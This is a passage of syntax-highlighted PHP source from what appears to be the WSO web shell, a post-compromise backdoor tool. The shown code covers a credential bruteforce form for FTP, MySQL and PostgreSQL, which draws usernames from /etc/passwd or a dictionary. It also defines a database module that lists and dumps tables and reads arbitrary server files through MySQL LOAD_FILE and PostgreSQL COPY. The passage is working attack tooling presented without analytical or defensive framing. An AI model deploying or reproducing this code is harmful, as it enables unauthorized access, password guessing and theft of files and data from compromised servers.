        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;span&amp;gt;Attempts:&amp;lt;/span&amp;gt; </span><span class="si">$attempts</span><span class="s2"> &amp;lt;span&amp;gt;Success:&amp;lt;/span&amp;gt; </span><span class="si">$success</span><span class="s2">&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;FTP bruteforce&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;table&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Type&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;select name=proto&amp;gt;&amp;lt;option value=ftp&amp;gt;FTP&amp;lt;/option&amp;gt;&amp;lt;option value=mysql&amp;gt;MySql&amp;lt;/option&amp;gt;&amp;lt;option value=pgsql&amp;gt;PostgreSql&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;input type=hidden name=c value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;input type=hidden name=a value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;input type=hidden name=charset value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;span&amp;gt;Server:port&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;input type=text name=server value=&quot;127.0.0.1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Brute type&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;label&amp;gt;&amp;lt;input type=radio name=type value=&quot;1&quot; checked&amp;gt; /etc/passwd&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;label style=&quot;padding-left:15px&quot;&amp;gt;&amp;lt;input type=checkbox name=reverse value=1 checked&amp;gt; reverse (login -&amp;gt; nigol)&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;label&amp;gt;&amp;lt;input type=radio name=type value=&quot;2&quot;&amp;gt; Dictionary&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;table style=&quot;padding-left:15px&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Login&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;input type=text name=login value=&quot;root&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Dictionary&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;input type=text name=dict value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;passwd.dic&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionSql</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">class</span> <span class="nc">DbClass</span> <span class="p">{</span>
        <span class="k">var</span> <span class="nv">$type</span><span class="p">;</span>
        <span class="k">var</span> <span class="nv">$link</span><span class="p">;</span>
        <span class="k">var</span> <span class="nv">$res</span><span class="p">;</span>
        <span class="k">function</span> <span class="nf">DbClass</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span>    <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">){</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="k">true</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="nv">$host</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nv">$host</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="mi">5432</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> port=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> user=</span><span class="si">$user</span><span class="s2"> password=</span><span class="si">$pass</span><span class="s2"> dbname=</span><span class="si">$dbname</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">selectdb</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span><span class="k">return</span> <span class="k">true</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">query</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="nb">func_num_args</span><span class="p">()</span><span class="o">?</span><span class="nb">func_get_arg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">:</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span><span class="p">;</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">listDbs</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SHOW databases&quot;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT datname FROM pg_database WHERE datistemplate!=&#39;t&#39;&quot;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">listTables</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SHOW TABLES&#39;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;select table_name from information_schema.tables where table_schema != &#39;information_schema&#39; AND table_schema != &#39;pg_catalog&#39;&quot;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">error</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_error</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">setCharset</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_set_charset&#39;</span><span class="p">))</span>
                        <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_set_charset</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">);</span>
                    <span class="k">else</span>
                        <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SET CHARSET &#39;</span><span class="o">.</span><span class="nv">$str</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_set_client_encoding</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">loadFile</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT LOAD_FILE(&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;) as file&quot;</span><span class="p">));</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE wso2(file text);COPY wso2 FROM &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;select file from wso2;&quot;</span><span class="p">);</span>
                    <span class="nv">$r</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span>
                        <span class="nv">$r</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$i</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;drop table wso2&#39;</span><span class="p">);</span>
                    <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">));</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$fp</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SHOW CREATE TABLE `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span>
                    <span class="nv">$create</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                    <span class="nv">$sql</span> <span class="o">=</span> <span class="nv">$create</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">else</span> <span class="k">echo</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span>
                    <span class="nv">$head</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
                        <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span>
                                <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;NULL&quot;</span><span class="p">;</span>
                            <span class="k">elseif</span><span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span>
                                <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
                            <span class="k">else</span>
                                <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.@</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
                            <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$head</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;INSERT INTO `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;` (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) VALUES </span><span class="se">\n\t</span><span class="s2">(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)&#39;</span><span class="p">;</span>
                            <span class="nv">$head</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
                        <span class="p">}</span> <span class="k">else</span>
                            <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\n\t</span><span class="s2">,(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)&#39;</span><span class="p">;</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">else</span> <span class="k">echo</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$head</span><span class="p">)</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">);</span> <span class="k">else</span> <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">);</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
                        <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
                            <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;INSERT INTO &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39; (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;) VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">else</span> <span class="k">echo</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DbClass</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
